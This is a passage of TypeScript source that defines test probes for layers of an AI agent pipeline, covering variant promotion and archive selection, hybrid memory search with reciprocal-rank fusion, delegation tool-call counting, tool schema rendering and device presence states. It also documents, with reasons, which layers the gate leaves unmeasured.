          { trialsSoFar: 12, pendingWins: 4, currentWins: 1, ties: 7 },
        ].map((pending) => s.decidePromotion({ version: 2, writtenAt: 0, rationale: 'r', ...pending }, DEFAULT_SHADOW_CONFIG)),
      },
      {
        id: 'evolution-gate/archive-explore-vs-exploit',
        asserts: 'the injected RNG picks the live trunk below the explore share and an archived variant above it',
        observe: (s) => {
          const archive = [
            archiveEntry({ version: 4, status: 'current' }),
            archiveEntry({ version: 3, status: 'rolled_back', trials: 6, wins: 2, losses: 4, winRate: 1 / 3 }),
            archiveEntry({ version: 2, status: 'historical', trials: 0, winRate: null }),
          ];
          return [0, 0.19, 0.2, 0.99].map((roll) =>
            s.selectEvolutionBase(archive, { exploreShare: 0.2, random: () => roll }));
        },
      },
      {
        id: 'evolution-gate/archive-never-branches-from-pending',
        asserts: 'a version still under trial is never a branch base, and an empty archive yields nothing',
        observe: (s) => ({
          withPending: s.selectEvolutionBase(
            [archiveEntry({ version: 5, status: 'current' }), archiveEntry({ version: 6, status: 'pending' })],
            { exploreShare: 1, random: () => 0 },
          ),
          empty: s.selectEvolutionBase([], { exploreShare: 1, random: () => 0 }),
        }),
      },
    ],
  },

  {
    id: 'memory-retrieval',
    owns: 'recall ranking: reciprocal-rank fusion and the lexical/semantic hybrid search over it',
    subjects: ['hybridSearch', 'reciprocalRankFusion'],
    probes: [
      {
        id: 'memory-retrieval/rrf-ranking',
        asserts: 'a document surfaced by both lists outranks one surfaced higher by a single list',
        observe: (s) => s.reciprocalRankFusion([
          [{ id: 'a' }, { id: 'b' }, { id: 'c' }],
          [{ id: 'b' }, { id: 'd' }],
        ]),
      },
      {
        id: 'memory-retrieval/rrf-constant',
        asserts: 'the RRF constant is the knob it claims to be, and single-list order is preserved',
        observe: (s) => ({
          k60: s.reciprocalRankFusion([[{ id: 'a' }, { id: 'b' }]]).map((h) => h.rrfScore),
          k1: s.reciprocalRankFusion([[{ id: 'a' }, { id: 'b' }]], 1).map((h) => h.rrfScore),
        }),
      },
      {
        id: 'memory-retrieval/hybrid-degrades-to-lexical',
        asserts: 'no vector store ⇒ lexical-only results, not an error and not an empty list',
        observe: async (s) => s.hybridSearch(
          'auth',
          async () => [lexicalHit('m1', 3.2), lexicalHit('m2', 1.1)],
          createNoopVectorStore(),
          { finalK: 5 },
        ),
      },
      {
        id: 'memory-retrieval/hybrid-merges-sources',
        asserts: 'both sources fuse, sources are labelled, and finalK bounds the result',
        observe: async (s) => s.hybridSearch(
          'auth',
          async () => [lexicalHit('m1', 3.2), lexicalHit('m2', 1.1)],
          fakeVectorStore([vectorHit('m2', 0.9), vectorHit('m3', 0.7)]),
          { finalK: 2 },
        ),
      },
    ],
  },

  {
    id: 'delegation',
    owns: 'the process evidence a turn leaves behind — how much work was staffed out versus ground through inline',
    subjects: ['delegationFeatures', 'renderDelegationFeatures'],
    probes: [
      {
        id: 'delegation/tool-call-counts',
        asserts: 'staffing / fork / messaging / execute_tools calls are counted by agents action — and legacy tool names — separately from total steps',
        observe: (s) => s.delegationFeatures({
          steps: 7,
          durationMs: 95_000,
          toolCalls: [
            { name: 'agents', args: { action: 'staff' }, result: null },
            { name: 'team', args: {}, result: null },
            { name: 'agents', args: { action: 'fork' }, result: null },
            { name: 'agents', args: { action: 'ask' }, result: null },
            { name: 'execute_tools', args: {}, result: null },
            { name: 'run', args: {}, result: null },
          ],
        }),
      },
      {
        id: 'delegation/no-delegation-is-zero-not-absent',
        asserts: 'a fully inline turn reports zeros, so "did not delegate" is measurable',
        observe: (s) => s.delegationFeatures({ steps: 3, durationMs: 4_000, toolCalls: [{ name: 'run', args: {}, result: null }] }),
      },
      {
        id: 'delegation/render-duration-units',
        asserts: 'the rendered evidence switches to minutes past a minute, with one decimal',
        observe: (s) => [4_000, 59_999, 60_000, 630_000].map((wallClockMs) =>
          s.renderDelegationFeatures({
            stepCount: 5, teamCalls: 2, thinkCalls: 1, peerCalls: 0, executeToolsCalls: 3,
            loopedCalls: 0, redundantCalls: 0, backtrackCalls: 0, wallClockMs,
          })),
      },
    ],
  },

  {
    id: 'tool-contract',
    owns: 'the built-in tool contract the model reads: the when-to-use doctrine carried in each schema description',
    subjects: ['renderToolSchemaDescription'],
    probes: [
      {
        id: 'tool-contract/description-shape',
        asserts: 'a spec renders summary, use-when, avoid-when and returns as labelled lines',
        observe: (s) => s.renderToolSchemaDescription(BUILTIN_TOOL_SPECS.agents),
      },
      {
        id: 'tool-contract/every-builtin-renders',
        asserts: 'every shipped built-in carries a complete doctrine block — none silently blank',
        observe: (s) => BUILTIN_TOOLS.map((name) => [name, s.renderToolSchemaDescription(BUILTIN_TOOL_SPECS[name])]),
      },
    ],
  },

  {
    id: 'execution-signal',
    owns: 'device presence: the three-state view of the user\'s PC and the one-turn transition notice',
    subjects: ['devicePresence', 'deviceChangeNotice', 'parseDevicePresence'],
    probes: [
      {
        id: 'execution-signal/presence-three-state',
        asserts: 'connected beats registered; unregistered is "none", never "offline"',
        observe: (s) => [
          { connected: true, registered: true },
          { connected: true, registered: false },
          { connected: false, registered: true },
          { connected: false, registered: false },
        ].map((status) => [status.connected, status.registered, s.devicePresence(status)]),
      },
      {
        id: 'execution-signal/transition-notices',
        asserts: 'only real transitions announce; first observation and offline↔none stay silent',
        observe: (s) => {
          const states = ['connected', 'offline', 'none'] as const;
          return [
            ...states.map((to) => [null, to, s.deviceChangeNotice(null, to)]),
            ...states.flatMap((from) => states.map((to) => [from, to, s.deviceChangeNotice(from, to)])),
          ];
        },
      },
      {
        id: 'execution-signal/watermark-parsing',
        asserts: 'an unknown or missing watermark means "never observed", not a fabricated state',
        observe: (s) => {
          const raws: Array<string | null | undefined> = ['connected', 'offline', 'none', 'bogus', '', null, undefined];
          return raws.map((raw) => [raw ?? null, s.parseDevicePresence(raw)]);
        },
      },
    ],
  },

  // ── declared, NOT measured ───────────────────────────────────────
  // These are real pipeline layers with no deterministic slice. They score
  // `null`, never 1: a gate that reports perfection for what it does not test
  // is worse than no gate.
  {
    id: 'tool-construction',
    owns: 'buildBuiltinTools — the per-turn decision of which tools exist, and the crafted-tool surfacing policy',
    subjects: [],
    probes: [],
    unmeasuredBecause:
      'buildBuiltinTools is a composition root, not a layer: it wires tools/clamp, safety/approval-gate and ' +
      'memory/hybrid-search into one ToolSet, so a fault in it is not attributable to a single layer. Splitting it ' +
      'is a production change, out of scope for the gate.',
  },
  {
    id: 'compaction-ladder',
    owns: 'the @better-compact ladder that actually rewrites history — codec, plan, transformTurns',
    subjects: [],
    probes: [],
    unmeasuredBecause:
      '@proteus/compaction depends on @proteus/core, so core cannot import it without a cycle. Its slice belongs ' +
      'in that package, driven by the same Layer contract.',
  },
  {
    id: 'backend-turn-driver',
    owns: 'the backend halves of the turn: cf beforeTurn/beforeStep/onChatResponse and the CLI processTurn loop',
    subjects: [],
    probes: [],
    unmeasuredBecause:
      'Both drivers live in packages that depend on core (cf-backend, cli-backend); core cannot reach them. Known ' +
      'divergences they carry — the CF-only null prune budget and the CLI-only injectIntoActiveTurn=false — are ' +
      'therefore invisible to this gate.',
  },
  {
    id: 'subordinate-runtime',
    owns: 'subordinate spawn/assign/dismiss ordering, inherited-context digest, facet lifecycle',
    subjects: [],
    probes: [],
    unmeasuredBecause:
      'The delegation RUNTIME lives in cf-backend (subordinate-support, facet-spawn); core owns only the process ' +
      'evidence, which the `delegation` layer measures.',
  },
]);
